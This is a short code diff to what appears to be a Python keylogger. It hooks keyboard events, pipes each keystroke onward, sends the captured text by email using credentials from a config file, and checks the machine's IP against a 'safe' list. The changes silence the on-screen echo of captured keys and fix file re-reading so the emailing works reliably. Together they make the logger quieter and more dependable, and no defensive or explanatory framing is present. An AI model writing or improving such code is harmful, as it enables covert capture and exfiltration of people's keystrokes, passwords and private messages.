@@ -26,7 +26,7 @@ system_is_safe = False
 #proc 1
 def on_keyboard_event(event):
     global_pipe.send(chr(event.Ascii))
-    print(chr(event.Ascii), end="")
+    #print(chr(event.Ascii), end="")
 
     return True
 
@@ -44,6 +44,7 @@ def get_permission_to_send():
 
 #proc 2
 def send_email(body):
+    f_conf.seek(0)
     args = f_conf.read().split(',')
     username = args[0]
     send_to = args[1]
@@ -66,6 +67,7 @@ def init_logging(pipe):
 if internet_on():
     try:
         curr_ip = get_own_ip()
+        f_ips.seek(0)
         safe_ips = f_ips.read().split(',')
         if curr_ip not in safe_ips:
             system_is_safe = False
